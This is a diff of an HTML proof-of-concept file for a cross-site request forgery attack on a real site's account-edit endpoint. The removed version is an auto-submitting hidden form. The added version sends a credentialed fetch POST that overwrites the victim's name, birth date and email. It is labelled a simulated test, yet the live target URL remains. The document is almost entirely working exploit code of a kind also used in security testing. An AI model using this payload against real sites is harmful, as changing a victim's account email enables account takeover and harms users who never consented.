@@ -1,16 +1,35 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://www.socialdeal.nl/modal/account/edit/" method="POST">
-      <input type="hidden" name="salutation" value="male">
-      <input type="hidden" name="firstName" value="nothing">
-      <input type="hidden" name="lastName" value="Khn">
-      <input type="hidden" name="birthDate-day" value="11">
-      <input type="hidden" name="birthDate-month" value="10">
-      <input type="hidden" name="birthDate-year" value="2013">
-      <input type="hidden" name="email" value="fj71115008vhhg@gmail.com">
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
+<body>
+<h3>CSRF Test (Simulated)</h3>
+
+<script>
+  // Replace URL with your local testing endpoint
+  const url = "https://www.socialdeal.nl/modal/account/edit/";
+
+  const data = new URLSearchParams();
+  data.append("salutation", "male");
+  data.append("firstName", "Hassann");
+  data.append("lastName", "Khakn");
+  data.append("birthDate-day", "17");
+  data.append("birthDate-month", "9");
+  data.append("birthDate-year", "1998");
+  data.append("email", "fj711hdh@gmail.com");
+
+  fetch(url, {
+    method: "POST",
+    body: data,
+    // This header is required by Socialdeal normally, but CORS blocks it cross-origin
+    headers: {
+      "X-Requested-With": "XMLHttpRequest",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    credentials: "include" // Sends cookies if same-origin
+  })
+  .then(res => res.text())
+  .then(console.log)
+  .catch(console.error);
+</script>
+
+</body>
 </html>
